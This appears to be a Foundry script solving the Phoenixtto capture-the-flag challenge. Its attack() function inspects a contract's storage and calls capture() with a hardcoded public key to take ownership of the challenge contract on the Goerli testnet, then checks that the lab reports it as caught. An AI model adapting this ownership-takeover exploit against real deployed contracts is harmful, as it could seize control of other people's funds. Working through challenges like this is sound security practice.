// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface ILab {
    function addr() external view returns (address);

    function getImplementation() external view returns (address);

    function isCaught() external view returns (bool);

    function mergePhoenixDitto() external;

    function reBorn(bytes memory _code) external;
}
interface IPhoenixtto {
    function capture(string memory _newOwner) external;

    function owner() external view returns (address);

    function reBorn() external;
}

contract PhoenixttoScript is Script {
    IPhoenixtto phoenixtto;
    ILab lab;

    address player = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
    function setUp() public {
        phoenixtto = IPhoenixtto(0xF34A76CA9E7d66559F319b3DABbc8A3a5Ef2Fc80);
        lab = ILab(0xefEde42f3E58cc2BA30b050ab57dbe890CadFb44);
    }


    function run() public {
        attack();
    }

    function attack() public {
        // string memory FORK_URL = "https://rpc.ankr.com/eth_goerli";
        // vm.createSelectFork(FORK_URL);

        string memory pubkey = string(bytes("\x90\xd2\xcf\xe9\x41\x2c\x9b\xe3\xc3\xb6\x79\x94\xb8\xf5\x51\x1a\xe3\xd9\x31\xde\x8a\x34\x94\xea\x22\x1e\x5b\xdd\xa0\xa9\x42\xde\x5d\x07\xe7\x0e\xbc\x12\x63\x65\x7f\xb9\x83\xd1\xf8\x9c\xf7\x35\x09\x57\x42\xde\x0a\x6d\x44\x7a\x5e\x16\xcc\x27\x9b\x1d\xef\xeb"));
        
        bytes32 isBorn = vm.load(address(phoenixtto), bytes32(uint256(0)));
        console.logBytes32(isBorn);

        console.log("B4 Bal =", player.balance);        

        vm.broadcast(player);
        phoenixtto.capture(pubkey);

        isBorn = vm.load(address(phoenixtto), bytes32(uint256(0)));
        console.logBytes32(isBorn);
        console.log("Ar Bal =", player.balance);

        require(lab.isCaught() == true, "Failed");
    }
}
